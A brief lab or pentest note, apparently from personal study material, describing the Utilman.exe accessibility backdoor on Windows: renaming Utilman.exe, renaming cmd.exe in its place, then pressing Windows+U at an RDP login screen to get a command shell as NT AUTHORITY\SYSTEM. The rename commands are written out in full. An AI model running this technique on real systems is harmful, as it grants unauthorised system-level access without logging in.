- We find Utilman.exe by navigating to "C:\Windows\system32":
  
![](Images/Pasted%20image%2020221012220556.png)

- We enter "ren Utilman.exe Utilman.old" and verify the filename modification:
  
![](Images/Pasted%20image%2020221012220652.png)

- We type the following command to rename cmd.exe to Ultiman.exe

ren cmd.exe Utilman.exe

-Once at the login page of the RDP session we type "windows key + u key" and receive a cmd session as NT authority/system:

#RDP #rdesktop

-After entering "windows + u" keys on the RDP session login page, we launch a CMD session as NT authority/system.

![](Images/Pasted%20image%2020221012220806.png)

![](Images/Pasted%20image%2020221012220843.png)

---
